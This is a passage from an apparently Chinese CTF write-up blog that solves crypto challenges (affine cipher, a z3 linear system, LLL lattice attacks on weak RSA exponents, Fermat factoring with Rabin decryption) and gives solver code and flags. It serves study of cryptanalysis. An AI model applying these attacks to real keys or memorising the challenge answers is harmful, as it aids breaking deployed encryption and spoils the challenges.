class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">letter=string.ascii_letters+string.digits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m, a, b</span>):</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        ch=m[i]</span><br><span class="line">        t=(letter.index(ch) * a + b) % <span class="number">62</span></span><br><span class="line">        c.append(letter[t])</span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        Cipher = encrypt(<span class="string">&#x27;flag&#x27;</span>, a, b)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)-<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> Cipher==s[k:k+<span class="number">4</span>]:</span><br><span class="line">                <span class="built_in">print</span>(Cipher,a,b)</span><br><span class="line"><span class="comment"># korv 11 17</span></span><br></pre></td></tr></table></figure><p>解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">11</span></span><br><span class="line">b=<span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">m, a, b</span>):</span><br><span class="line">    <span class="keyword">import</span> gmpy2</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        ch=m[i]</span><br><span class="line">        t=((letter.index(ch) - b) * gmpy2.invert(a,<span class="number">62</span>)) % <span class="number">62</span></span><br><span class="line">        c.append(letter[t])</span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">m=decrypt(s, a, b)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">flag = hashlib.md5(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(m)).encode(<span class="string">&quot;utf8&quot;</span>)).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># Oh62Affine1sSti1lN0tSecureEnoughToProtectflag</span></span><br><span class="line"><span class="comment"># 2b9b99caae1cc49e5b5aacbc8cc22350</span></span><br></pre></td></tr></table></figure><p>flag：flag{2b9b99caae1cc49e5b5aacbc8cc22350}</p><p>​    </p><h3 id="LINE-GENERATION-TEST"><a href="#LINE-GENERATION-TEST" class="headerlink" title="LINE-GENERATION-TEST"></a>LINE-GENERATION-TEST</h3><blockquote><p>“Sorry, Tazmi, I can’t hold you in my arms anymore” Who said that? flag{md5(result)}</p><p><img src="/2022/02/20/match-HSC-1th-2022/task.png" alt="task" style="zoom:80%;"></p></blockquote><p>根据 <code>enc</code> 结果，猜测为 $\mod 26$ 下的矩阵运算，值对应字母序，简单用z3解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f=[Int(<span class="string">f&#x27;f<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">out=[<span class="number">9</span>,<span class="number">23</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">19</span>]</span><br><span class="line"></span><br><span class="line">ss=Solver()</span><br><span class="line"></span><br><span class="line">ss.add((f[<span class="number">0</span>]+f[<span class="number">1</span>])%<span class="number">26</span>==out[<span class="number">0</span>])</span><br><span class="line">ss.add((f[<span class="number">1</span>]+f[<span class="number">4</span>])%<span class="number">26</span>==out[<span class="number">1</span>])</span><br><span class="line">ss.add((f[<span class="number">2</span>]+f[<span class="number">3</span>]+f[<span class="number">4</span>])%<span class="number">26</span>==out[<span class="number">2</span>])</span><br><span class="line">ss.add((f[<span class="number">1</span>]+f[<span class="number">2</span>]+f[<span class="number">3</span>])%<span class="number">26</span>==out[<span class="number">3</span>])</span><br><span class="line">ss.add((f[<span class="number">3</span>])%<span class="number">26</span>==out[<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    ss.add(f[i]&gt;=<span class="number">0</span>)</span><br><span class="line">    ss.add(f[i]&lt;<span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">ss.check()</span><br><span class="line">m=ss.model()</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    res+=<span class="built_in">chr</span>(m[f[i]].as_long()+<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># RSCTF</span></span><br></pre></td></tr></table></figure><p>MD5，得flag：flag{e4163deba70420c58acb87abcab34141}</p><p>​    </p><h3 id="LATTICE"><a href="#LATTICE" class="headerlink" title="LATTICE"></a>LATTICE</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;******&#125;&#x27;</span>.strip(<span class="string">b&#x27;flag&#123;&#x27;</span>).strip(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">_length = <span class="built_in">len</span>(flag)</span><br><span class="line">f1, f2, f3 = [flag[_*_length//<span class="number">3</span>:(_+<span class="number">1</span>)*_length//<span class="number">3</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part1</span></span><br><span class="line">m1 = bytes_to_long(f1)</span><br><span class="line">p1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">q1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">n1 = p1 * q1</span><br><span class="line">phi1 = n1 - p1 - q1 + <span class="number">1</span></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, n1)</span><br><span class="line">e1 = invert(getPrime(<span class="number">730</span>), phi1)</span><br><span class="line">e2 = invert(getPrime(<span class="number">730</span>), phi1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c1=<span class="subst">&#123;c1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n1=<span class="subst">&#123;n1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e1, e2=<span class="subst">&#123;e1&#125;</span>, <span class="subst">&#123;e2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># c1=...</span></span><br><span class="line"><span class="comment"># n1=...</span></span><br><span class="line"><span class="comment"># e1, e2=...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part2</span></span><br><span class="line">m2 = bytes_to_long(f2)</span><br><span class="line">p2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">q2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">n2 = p2 * q2</span><br><span class="line">phi2 = n2 - p2 - q2 + <span class="number">1</span></span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, n2)</span><br><span class="line">e1 = invert(getPrime(<span class="number">818</span>), phi2)</span><br><span class="line">e2 = invert(getPrime(<span class="number">818</span>), phi2)</span><br><span class="line">e3 = invert(getPrime(<span class="number">818</span>), phi2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c2=<span class="subst">&#123;c2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n2=<span class="subst">&#123;n2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e1, e2, e3=<span class="subst">&#123;e1&#125;</span>, <span class="subst">&#123;e2&#125;</span>, <span class="subst">&#123;e3&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># c2=...</span></span><br><span class="line"><span class="comment"># n2=...</span></span><br><span class="line"><span class="comment"># e1, e2, e3=...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part3</span></span><br><span class="line">m3 = bytes_to_long(f3)</span><br><span class="line">nl = []</span><br><span class="line">cl = []</span><br><span class="line">el = []</span><br><span class="line">d = getPrime(<span class="number">890</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    p3 = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q3 = getPrime(<span class="number">1024</span>)</span><br><span class="line">    n3 = p3 * q3</span><br><span class="line">    phi3 = n3 - p3 - q3 + <span class="number">1</span></span><br><span class="line">    e3 = invert(d, phi3)</span><br><span class="line">    c3 = <span class="built_in">pow</span>(m3, e3, n3)</span><br><span class="line">    nl.append(n3)</span><br><span class="line">    el.append(<span class="built_in">int</span>(e3))</span><br><span class="line">    cl.append(<span class="built_in">int</span>(c3))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;nl=<span class="subst">&#123;nl&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;el=<span class="subst">&#123;el&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cl=<span class="subst">&#123;cl&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># nl=[...]</span></span><br><span class="line"><span class="comment"># el=[...]</span></span><br><span class="line"><span class="comment"># cl=[...]</span></span><br></pre></td></tr></table></figure></blockquote><p>RSA的两种涉及格的LLL算法的攻击情形（多组低解密指数攻击+共私钥指数攻击）。</p><p>Part1，2组 $e$ 的低解密指数攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">N = </span><br><span class="line">e1 = </span><br><span class="line">e2 = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    alpha2 = i/<span class="number">1000</span></span><br><span class="line">    M1 = <span class="built_in">int</span>(gmpy2.mpz(N)**<span class="number">0.5</span>)</span><br><span class="line">    M2 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">1</span>+alpha2) )</span><br><span class="line">    D = diagonal_matrix(ZZ, [N, M1, M2, <span class="number">1</span>])</span><br><span class="line">    B = Matrix(ZZ, [ [<span class="number">1</span>, -N,   <span class="number">0</span>,  N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>, e1, -e1, -e1*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,  e2, -e2*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>, e1*e2] ]) * D</span><br><span class="line">    L = B.LLL()</span><br><span class="line">    v = Matrix(ZZ, L[<span class="number">0</span>])</span><br><span class="line">    x = v * B**(-<span class="number">1</span>)</span><br><span class="line">    phi = (x[<span class="number">0</span>,<span class="number">1</span>]/x[<span class="number">0</span>,<span class="number">0</span>]*e1).floor()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = inverse_mod(<span class="number">65537</span>, phi)</span><br><span class="line">        m = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(power_mod(c, d, N))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(m)&lt;<span class="number">20</span>:</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># b&#x27;89c63fd5-00c&#x27;</span></span><br></pre></td></tr></table></figure><p>Part2，3组 $e$ 的低解密指数攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">N = </span><br><span class="line">e1 = </span><br><span class="line">e2 = </span><br><span class="line">e3 = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    alpha2 = i/<span class="number">1000</span></span><br><span class="line">    M1 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span>))</span><br><span class="line">    M2 = <span class="built_in">int</span>( gmpy2.mpz(N) )</span><br><span class="line">    M3 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span> + alpha2))</span><br><span class="line">    M4 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">0.5</span>) )</span><br><span class="line">    M5 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span> + alpha2) )</span><br><span class="line">    M6 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">1.</span>+alpha2) )</span><br><span class="line">    M7 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">1.</span>+alpha2) )</span><br><span class="line">    D = diagonal_matrix(ZZ, [M1, M2, M3, M4, M5, M6, M7, <span class="number">1</span>])</span><br><span class="line">    B = Matrix(ZZ, [ [<span class="number">1</span>, -N,   <span class="number">0</span>,  N**<span class="number">2</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,    -N**<span class="number">3</span>],</span><br><span class="line">                 [<span class="number">0</span>, e1, -e1, -e1*N, -e1,      <span class="number">0</span>,   e1*N,  e1*N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,  e2, -e2*N,   <span class="number">0</span>,   e2*N,      <span class="number">0</span>,  e2*N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>, e1*e2,   <span class="number">0</span>, -e1*e2, -e1*e2, -e1*e2*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,  e3,  -e3*N,  -e3*N,  e3*N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,  e1*e3,      <span class="number">0</span>, -e1*e3*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,  e2*e3, -e2*e3*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>, e1*e2*e3] ]) * D</span><br><span class="line">    L = B.LLL()</span><br><span class="line">    v = Matrix(ZZ, L[<span class="number">0</span>])</span><br><span class="line">    x = v * B**(-<span class="number">1</span>)</span><br><span class="line">    phi_ = (e1*x[<span class="number">0</span>,<span class="number">1</span>]/x[<span class="number">0</span>,<span class="number">0</span>]).floor()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = inverse_mod(<span class="number">65537</span>, phi_)</span><br><span class="line">        m = <span class="built_in">hex</span>(power_mod(c, d, N))[<span class="number">2</span>:]</span><br><span class="line">        m = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(power_mod(c, d, N))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(m)&lt;<span class="number">20</span>:</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># b&#x27;f-4ae0-b369-&#x27; </span></span><br></pre></td></tr></table></figure><p>Part3，共私钥指数 $d$ 攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">nl=[...]</span><br><span class="line">el=[...]</span><br><span class="line">cl=[...]</span><br><span class="line">ind=[]</span><br><span class="line">nl_s=<span class="built_in">sorted</span>(nl)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    ind.append(nl.index(nl_s[i]))</span><br><span class="line"><span class="built_in">print</span>(ind)</span><br><span class="line">e=[]</span><br><span class="line">n=[]</span><br><span class="line">c=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    e.append(el[ind[i]])</span><br><span class="line">    n.append(nl[ind[i]])</span><br><span class="line">    c.append(cl[ind[i]])</span><br><span class="line"></span><br><span class="line">M=iroot(<span class="built_in">int</span>(n[<span class="number">6</span>]),<span class="built_in">int</span>(<span class="number">2</span>))[<span class="number">0</span>]</span><br><span class="line">a=[<span class="number">0</span>]*<span class="number">8</span></span><br><span class="line">a[<span class="number">0</span>]=[M,e[<span class="number">0</span>],e[<span class="number">1</span>],e[<span class="number">2</span>],e[<span class="number">3</span>],e[<span class="number">4</span>],e[<span class="number">5</span>],e[<span class="number">6</span>]]</span><br><span class="line">a[<span class="number">1</span>]=[<span class="number">0</span>,-n[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">2</span>]=[<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">3</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">2</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">4</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">3</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">5</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">4</span>],<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">6</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">5</span>],<span class="number">0</span>]</span><br><span class="line">a[<span class="number">7</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">6</span>]]</span><br><span class="line"></span><br><span class="line">Mat = matrix(ZZ,a)</span><br><span class="line">Mat_LLL=Mat.LLL()</span><br><span class="line">d = <span class="built_in">abs</span>(Mat_LLL[<span class="number">0</span>][<span class="number">0</span>])//M</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">pow</span>(c[<span class="number">6</span>],<span class="built_in">int</span>(d),<span class="built_in">int</span>(n[<span class="number">6</span>])))[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;5a3d94a20a2c&#x27;</span></span><br></pre></td></tr></table></figure><p>连接得flag：flag{89c63fd5-00cf-4ae0-b369-5a3d94a20a2c}</p><p>​    </p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><blockquote><p>flag{md5(result)}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;????&#x27;</span></span><br><span class="line"></span><br><span class="line">z=getPrime(<span class="number">1024</span>)</span><br><span class="line">p=sympy.nextprime(z)</span><br><span class="line">q=sympy.prevprime(<span class="number">10</span>*z)</span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">e=<span class="number">0xe18e</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n= ...</span></span><br><span class="line"><span class="comment">#c= ...</span></span><br></pre></td></tr></table></figure></blockquote><p>费马分解RSA，发现 $\gcd(e,\varphi(n))=2$，令 $e’=\frac{e}{2},m’=m^2$，</p><p>先求出 $m’$，再利用Rabin算法求 $m$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">0xe18e</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = gmpy2.iroot(n//<span class="number">10</span>,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    p = gmpy2.next_prime(p)</span><br><span class="line">    <span class="keyword">if</span> n%p==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">q = n//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e//<span class="number">2</span>,f)</span><br><span class="line">mm = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(mm)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rabin_decrypt</span>(<span class="params">c, p, q, e=<span class="number">2</span></span>):</span><br><span class="line">n = p * q</span><br><span class="line">mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">yp = gmpy2.invert(p, q)</span><br><span class="line">yq = gmpy2.invert(q, p)</span><br><span class="line">r = (yp * p * mq + 